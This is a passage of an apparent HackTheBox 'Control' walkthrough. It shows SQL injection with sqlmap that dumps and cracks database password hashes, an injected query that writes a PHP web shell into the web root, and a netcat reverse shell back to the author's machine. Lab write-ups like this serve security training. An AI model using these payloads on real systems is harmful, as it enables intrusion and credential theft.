class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Server: Microsoft-IIS/10.0</span><br><span class="line">X-Powered-By: PHP/7.3.7</span><br><span class="line">Date: Fri, 24 Apr 2020 21:19:45 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 7933</span><br></pre></td></tr></table></figure><p>In <strong>BurpSuite</strong> i successfully get the admin panel.</p><p><img src="/img/control/control-burp.png" alt="HackTheBox-Control" title="Control Intercept"></p><p>now right click then choose <code>Show response in browser</code>, copy then paste it to browser and I have now the admin panel.</p><p><img src="/img/control/control-admin-home-page.png" alt="HackTheBox-Control" title="Control ADMIN Panel"></p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>from <strong>Find Products</strong> I‚Äôll try to input a single colon <code>&#39;</code> in search bar, I notice that this is vulnerable to <strong>SQL Injection</strong></p><p><img src="/img/control/control-sqli-error.png" alt="HackTheBox-Control" title="Control ADMIN Panel"></p><p>Next i try to capture the request of search products and copy into a text file.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">POST /search_products.php HTTP/1.1</span><br><span class="line">Host: 10.10.10.167</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.10.10.167/admin.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 192.168.4.28</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">productName=D-Link<span class="string">'</span></span><br></pre></td></tr></table></figure><h3 id="Enumerate-with-SQLMap"><a href="#Enumerate-with-SQLMap" class="headerlink" title="Enumerate with SQLMap"></a>Enumerate with SQLMap</h3><p>next thing I did is to execute <code>SQLMap</code> with the text file which contain request i‚Äôve copy so :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control </span><br><span class="line">‚ùØ sqlmap -r request.txt --all --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;<span class="number">1.4</span><span class="number">.3</span><span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [)]     | .<span class="string">'| . |</span></span><br><span class="line"><span class="string">|___|_  ['</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent <span class="keyword">is</span> illegal. It <span class="keyword">is</span> the end use<span class="string">r's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 05:12:37 /2020-04-25/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[05:22:23] [INFO] parsing HTTP request from '</span>request.txt<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:23] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[05:22:23] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[05:22:25] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[05:22:25] [INFO] testing if POST parameter '</span>productName<span class="string">' is dynamic</span></span><br><span class="line"><span class="string">[05:22:25] [WARNING] POST parameter '</span>productName<span class="string">' does not appear to be dynamic</span></span><br><span class="line"><span class="string">[05:22:25] [INFO] heuristic (basic) test shows that POST parameter '</span>productName<span class="string">' might be injectable (possible DBMS: '</span>MySQL<span class="string">')</span></span><br><span class="line"><span class="string">[05:22:25] [INFO] heuristic (XSS) test shows that POST parameter '</span>productName<span class="string">' might be vulnerable to cross-site scripting (XSS) attacks</span></span><br><span class="line"><span class="string">[05:22:25] [INFO] testing for SQL injection on POST parameter '</span>productName<span class="string">'</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is '</span>MySQL<span class="string">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for '</span>MySQL<span class="string">' extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[05:22:25] [INFO] testing '</span>AND boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:28] [INFO] testing '</span>Boolean-based blind - Parameter replace (original value)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:28] [INFO] testing '</span>Generic inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:29] [INFO] testing '</span>AND boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause (MySQL comment)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:45] [INFO] testing '</span>OR boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause (MySQL comment)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:46] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[05:22:48] [INFO] POST parameter '</span>productName<span class="string">' appears to be '</span>OR boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause (MySQL comment)<span class="string">' injectable (with --string="33")</span></span><br><span class="line"><span class="string">[05:22:48] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY <span class="keyword">or</span> GROUP BY clause (BIGINT UNSIGNED)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:48] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> OR error-based - WHERE <span class="keyword">or</span> HAVING clause (BIGINT UNSIGNED)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:48] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY <span class="keyword">or</span> GROUP BY clause (EXP)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:48] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> OR error-based - WHERE <span class="keyword">or</span> HAVING clause (EXP)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:48] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> AND error-based - WHERE, HAVING, ORDER BY <span class="keyword">or</span> GROUP BY clause (JSON_KEYS)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:49] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> OR error-based - WHERE <span class="keyword">or</span> HAVING clause (JSON_KEYS)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:49] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY <span class="keyword">or</span> GROUP BY clause (FLOOR)<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:49] [INFO] POST parameter '</span>productName<span class="string">' is '</span>MySQL &gt;= <span class="number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY <span class="keyword">or</span> GROUP BY clause (FLOOR)<span class="string">' injectable </span></span><br><span class="line"><span class="string">[05:22:49] [INFO] testing '</span>MySQL inline queries<span class="string">'</span></span><br><span class="line"><span class="string">[05:22:49] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> stacked queries (comment)<span class="string">'</span></span><br><span class="line"><span class="string">[05:23:00] [INFO] POST parameter '</span>productName<span class="string">' appears to be '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> stacked queries (comment)<span class="string">' injectable </span></span><br><span class="line"><span class="string">[05:23:00] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> AND time-based blind (query SLEEP)<span class="string">'</span></span><br><span class="line"><span class="string">[05:23:11] [INFO] POST parameter '</span>productName<span class="string">' appears to be '</span>MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> AND time-based blind (query SLEEP)<span class="string">' injectable </span></span><br><span class="line"><span class="string">[05:23:11] [INFO] testing '</span>Generic UNION query (NULL) - <span class="number">1</span> to <span class="number">20</span> columns<span class="string">'</span></span><br><span class="line"><span class="string">[05:23:11] [INFO] testing '</span>MySQL UNION query (NULL) - <span class="number">1</span> to <span class="number">20</span> columns<span class="string">'</span></span><br><span class="line"><span class="string">[05:23:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[05:23:11] [INFO] '</span>ORDER BY<span class="string">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span></span><br><span class="line"><span class="string">[05:23:12] [INFO] target URL appears to have 6 columns in query</span></span><br><span class="line"><span class="string">[05:23:13] [INFO] POST parameter '</span>productName<span class="string">' is '</span>MySQL UNION query (NULL) - <span class="number">1</span> to <span class="number">20</span> columns<span class="string">' injectable</span></span><br><span class="line"><span class="string">[05:23:13] [WARNING] in OR boolean-based injection cases, please consider usage of switch '</span>--drop-set-cookie<span class="string">' if you experience any problems during data retrieval</span></span><br><span class="line"><span class="string">POST parameter '</span>productName<span class="string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: productName (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: productName=-3651'</span> OR <span class="number">5241</span>=<span class="number">5241</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY <span class="keyword">or</span> GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: productName=D-Link<span class="string">' AND (SELECT 3313 FROM(SELECT COUNT(*),CONCAT(0x716a766a71,(SELECT (ELT(3313=3313,1))),0x716a766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- coRF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: stacked queries</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 stacked queries (comment)</span></span><br><span class="line"><span class="string">    Payload: productName=D-Link'</span>;SELECT SLEEP(<span class="number">5</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: productName=D-Link<span class="string">' AND (SELECT 8833 FROM (SELECT(SLEEP(5)))GPos)-- HRou</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: productName=D-Link'</span> UNION ALL SELECT NULL,CONCAT(<span class="number">0x716a766a71</span>,<span class="number">0x6e566666527077704a594576707848646771786648416442544a73774d4676706f73474d49735947</span>,<span class="number">0x716a766271</span>),NULL,NULL,NULL,NULL<span class="comment">#</span></span><br><span class="line">---</span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">13</span>] [INFO] the back-end DBMS <span class="keyword">is</span> MySQL</span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">13</span>] [INFO] fetching banner</span><br><span class="line">back-end DBMS: MySQL &gt;= <span class="number">5.0</span> (MariaDB fork)</span><br><span class="line">banner: <span class="string">'10.4.8-MariaDB'</span></span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">14</span>] [INFO] fetching current user</span><br><span class="line">current user: <span class="string">'manager@localhost'</span></span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">14</span>] [INFO] fetching current database</span><br><span class="line">current database: <span class="string">'warehouse'</span></span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">14</span>] [INFO] fetching server hostname</span><br><span class="line">hostname: <span class="string">'Fidelity'</span></span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">14</span>] [INFO] testing <span class="keyword">if</span> current user <span class="keyword">is</span> DBA</span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">14</span>] [INFO] fetching current user</span><br><span class="line">current user <span class="keyword">is</span> DBA: <span class="literal">False</span></span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">14</span>] [INFO] fetching database users</span><br><span class="line">database management system users [<span class="number">6</span>]:</span><br><span class="line">[*] <span class="string">'hector'</span>@<span class="string">'localhost'</span></span><br><span class="line">[*] <span class="string">'manager'</span>@<span class="string">'localhost'</span></span><br><span class="line">[*] <span class="string">'root'</span>@<span class="string">'127.0.0.1'</span></span><br><span class="line">[*] <span class="string">'root'</span>@<span class="string">'::1'</span></span><br><span class="line">[*] <span class="string">'root'</span>@<span class="string">'fidelity'</span></span><br><span class="line">[*] <span class="string">'root'</span>@<span class="string">'localhost'</span></span><br><span class="line"></span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">15</span>] [INFO] fetching database users password hashes</span><br><span class="line">do you want to store hashes to a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y/N] N</span><br><span class="line">do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y</span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">15</span>] [INFO] using hash method <span class="string">'mysql_passwd'</span></span><br><span class="line">what dictionary do you want to use?</span><br><span class="line">[<span class="number">1</span>] default dictionary file <span class="string">'/usr/share/sqlmap/data/txt/wordlist.tx_'</span> (press Enter)</span><br><span class="line">[<span class="number">2</span>] custom dictionary file</span><br><span class="line">[<span class="number">3</span>] file <span class="keyword">with</span> list of dictionary files</span><br><span class="line">&gt; <span class="number">1</span></span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">15</span>] [INFO] using default dictionary</span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N] N</span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">15</span>] [INFO] starting dictionary-based cracking (mysql_passwd)</span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">15</span>] [INFO] starting <span class="number">4</span> processes </span><br><span class="line">[<span class="number">05</span>:<span class="number">23</span>:<span class="number">30</span>] [INFO] cracked password <span class="string">'l3tm3!n'</span> <span class="keyword">for</span> user <span class="string">'manager'</span>                                                                                                                           </span><br><span class="line">database management system users password hashes:                                                                                                                                         </span><br><span class="line">[*] hector [<span class="number">1</span>]:</span><br><span class="line">    password hash: *<span class="number">0E178792</span>E8FC304A2E3133D535D38CAF1DA3CD9D</span><br><span class="line">[*] manager [<span class="number">1</span>]:</span><br><span class="line">    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA</span><br><span class="line">    clear-text password: l3tm3!n</span><br><span class="line">[*] root [<span class="number">1</span>]:</span><br><span class="line">    password hash: *<span class="number">0</span>A4A5CAD344718DC418035A1F4D292BA603134D8</span><br></pre></td></tr></table></figure><p>The most interesting part is I capture the hashes of users, there‚Äôs a clear-text password from user <code>manager</code> : <code>&#39;l3tm3!n&#39;</code> at first I thought the user is the manager. but it‚Äôs a shit wasting my time. so I get the hash of user <code>Hector</code>, the creds I get will be usefull later‚Äô because now I need to get first the <strong>RCE or Remote Code Execution</strong>.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="SQLi-to-RCE-Remote-Code-Execution"><a href="#SQLi-to-RCE-Remote-Code-Execution" class="headerlink" title="SQLi to RCE(Remote Code Execution)"></a>SQLi to RCE(Remote Code Execution)</h3><p>Well‚Äô <strong>SQLi</strong> attack is really dangerous because the attacker can get access from the victim machine by injecting malicious code. Our target is vulnerable from that attack so from the previous request i‚Äôve copy in the text file, i‚Äôll intercept and inject a malicious code to get a <strong>RCE</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">POST /search_products.php HTTP/1.1</span><br><span class="line">Host: 10.10.10.167</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.10.10.167/admin.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 192.168.4.28</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">productName=D-Link<span class="string">'; select "&lt;?php echo shell_exec($_GET['</span>c<span class="string">']);?&gt;" into OUTFILE '</span>C:\\Inetpub\\wwwroot\\cmdshell.php<span class="string">';#</span></span><br></pre></td></tr></table></figure><p>and the HTTP response</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Server: Microsoft-IIS/10.0</span><br><span class="line">X-Powered-By: PHP/7.3.7</span><br><span class="line">Date: Fri, 24 Apr 2020 21:53:32 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length:</span><br></pre></td></tr></table></figure><p>Now I successfully get <strong>RCE</strong></p><h3 id="Gain-Reverse-Shell"><a href="#Gain-Reverse-Shell" class="headerlink" title="Gain Reverse Shell"></a>Gain Reverse Shell</h3><p><img src="/img/control/control-iusr.png" alt="HackTheBox-Control" title="Control iusr"></p><p>Next step is to get reverse shell‚Äô I‚Äôll try to upload a <code>PHP webshell</code>, luckily with <code>SQLMap</code> I can upload shell, I‚Äôll use the previous request i‚Äôve save in a text file then <strong>Winter Webshell</strong> so I can upload more stuffs if needed :</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ sqlmap -r request.txt --file-write=webshell.php --file-dest=c:/inetpub/wwwroot/webshell.php</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;<span class="number">1.4</span><span class="number">.3</span><span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">'| . |</span></span><br><span class="line"><span class="string">|___|_  [.]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state <span class="keyword">and</span> federal laws. Developers assume no liability <span class="keyword">and</span> are <span class="keyword">not</span> responsible <span class="keyword">for</span> any misuse <span class="keyword">or</span> damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ <span class="number">06</span>:<span class="number">34</span>:<span class="number">00</span> /<span class="number">2020</span><span class="number">-04</span><span class="number">-25</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">06</span>:<span class="number">34</span>:<span class="number">00</span>] [INFO] parsing HTTP request <span class="keyword">from</span> <span class="string">'request.txt'</span></span><br><span class="line">[<span class="number">06</span>:<span class="number">34</span>:<span class="number">00</span>] [INFO] resuming back-end DBMS <span class="string">'mysql'</span> </span><br><span class="line">[<span class="number">06</span>:<span class="number">34</span>:<span class="number">00</span>] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) <span class="keyword">from</span> stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: productName (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause (MySQL comment)</span><br><span class="line">    Payload: productName=<span class="number">-3651</span><span class="string">' OR 5241=5241#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: productName=D-Link'</span> AND (SELECT <span class="number">3313</span> FROM(SELECT COUNT(*),CONCAT(<span class="number">0x716a766a71</span>,(SELECT (ELT(<span class="number">3313</span>=<span class="number">3313</span>,<span class="number">1</span>))),<span class="number">0x716a766271</span>,FLOOR(RAND(<span class="number">0</span>)*<span class="number">2</span>))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- coRF</span><br><span class="line"></span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> stacked queries (comment)</span><br><span class="line">    Payload: productName=D-Link<span class="string">';SELECT SLEEP(5)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: productName=D-Link'</span> AND (SELECT <span class="number">8833</span> FROM (SELECT(SLEEP(<span class="number">5</span>)))GPos)-- HRou</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - <span class="number">6</span> columns</span><br><span class="line">    Payload: productName=D-Link<span class="string">' UNION ALL SELECT NULL,CONCAT(0x716a766a71,0x6e566666527077704a594576707848646771786648416442544a73774d4676706f73474d49735947,0x716a766271),NULL,NULL,NULL,NULL#</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[06:34:00] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[06:34:00] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[06:34:04] [INFO] the back-end DBMS operating system is Windows</span></span><br><span class="line"><span class="string">[06:34:05] [WARNING] potential permission problems detected ('</span>Access denied<span class="string">')</span></span><br><span class="line"><span class="string">[06:34:30] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)                                                             </span></span><br><span class="line"><span class="string">[06:34:39] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '</span>--time-sec<span class="string">' as possible (e.g. 10 or more)</span></span><br><span class="line"><span class="string">do you want confirmation that the local file '</span>webshell.php<span class="string">' has been successfully written on the back-end DBMS file system ('</span>c:/inetpub/wwwroot/webshell.php<span class="string">')? [Y/n] y</span></span><br><span class="line"><span class="string">[06:34:44] [INFO] the local file '</span>webshell.php<span class="string">' and the remote file '</span>c:/inetpub/wwwroot/webshell.php<span class="string">' have the same size (7205 B)</span></span><br><span class="line"><span class="string">[06:34:45] [INFO] fetched data logged to text files under '</span>/root/.sqlmap/output/<span class="number">10.10</span><span class="number">.10</span><span class="number">.167</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 06:34:45 /2020-04-25/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in htb/boxes/Control via üêò v7.3.15 took 45s </span></span><br><span class="line"><span class="string">‚ùØ</span></span><br></pre></td></tr></table></figure><p>as you can see I successfully upload my webshell now it‚Äôs time to visit from the website so :</p><p><img src="/img/control/control-webshell.png" alt="HackTheBox-Control" title="Control IUSR"></p><p>Next i upload <code>nc.exe</code> but the I dont have permission to that in directory <code>/inetpub/wwwroot/</code></p><p><img src="/img/control/control-webshell-permission-denied.png" alt="HackTheBox-Control" title="Control IUSR"></p><p>so I decided to create a new folder named <code>Payas0</code>, setup <code>SAMBA Shares</code> and finally I managed now to upload my <code>nc.exe</code></p><p><img src="/img/control/control-nc-exe.png" alt="HackTheBox-Control" title="Control IUSR"></p><p>Now i execute <code>nc.exe</code> with my <strong>IP</strong> and <strong>Port</strong> and setup a <code>netcat</code> lister in my host.</p><p><img src="/img/control/control-netcat-connect.png" alt="HackTheBox-Control" title="Control IUSR"></p><p>Finally I have now the initial shell.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control via üêò v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">‚ùØ nc -nlvp <span class="number">9001</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">9001</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.15</span><span class="number">.102</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.167</span>] <span class="number">53096</span></span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\iusr</span><br><span class="line">PS C:\payas0&gt; hostname</span><br><span class="line">hostname</span><br><span class="line">Fidelity</span><br><span class="line">PS C:\payas0&gt;</span><br></pre></td></tr></table></figure><p>the user flag is currently not accessible for the user I have. I‚Äôll try first to enumerate the file directory in <code>/inetpub/wwwroot</code></p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># bash</span><br><span class="line"></span><br><span class="line">PS C:\inetpub\wwwroot&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub\wwwroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                                                                  </span><br><span class="line">----                -------------         ------ ----                                                                  </span><br><span class="line">d-----       <span class="number">10</span>/<span class="number">23</span>/<span class="number">2019</span>   <span class="number">5</span>:<span class="number">02</span> PM                assets                                                                </span><br><span class="line">d-----        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM                images                                                                </span><br><span class="line">d-----       <span class="number">11</span>/<span class="number">12</span>/<span class="number">2019</span>  <span class="number">11</span>:<span class="number">49</span> AM                uploads                                                               </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM           <span class="number">7867</span> about.php                                                             </span><br><span class="line">-a----       <span class="number">11</span>/<span class="number">20</span>/<span class="number">2019</span>   <span class="number">1</span>:<span class="number">16</span> AM           <span class="number">7350</span> admin.php                                                             </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM            <span class="number">479</span> create_category.php                                                   </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM            <span class="number">585</span> create_product.php                                                    </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM            <span class="number">904</span> database.php                                                          </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM            <span class="number">423</span> delete_category.php                                                   </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM            <span class="number">558</span> delete_product.php                                                    </span><br><span class="line">-a----        <span class="number">4</span>/<span class="number">25</span>/<span class="number">2020</span>   <span class="number">1</span>:<span class="number">15</span> AM          <span class="number">15744</span> f2013115840359271c1f3e4661091efa.php                                  </span><br><span class="line">-a----       <span class="number">11</span>/<span class="number">19</span>/<span class="number">2019</span>   <span class="number">5</span>:<span class="number">57</span> PM           <span class="number">3145</span> index.php                                                             </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM          <span class="number">17128</span> LICENSE.txt                                                           </span><br><span class="line">-a----       <span class="number">11</span>/<span class="number">19</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">07</span> PM           <span class="number">3578</span> search_products.php                                                   </span><br><span class="line">-a----        <span class="number">4</span>/<span class="number">25</span>/<span class="number">2020</span>   <span class="number">1</span>:<span class="number">24</span> AM             <span class="number">38</span> sicherheitpro3.php                                                    </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span class="number">42</span> PM            <span class="number">498</span> update_category.php                                                   </span><br><span class="line">------        <span class="number">11</span>/<span class="number">5</span>/<span class="number">2019</span>   <span class="number">2</span>:<span 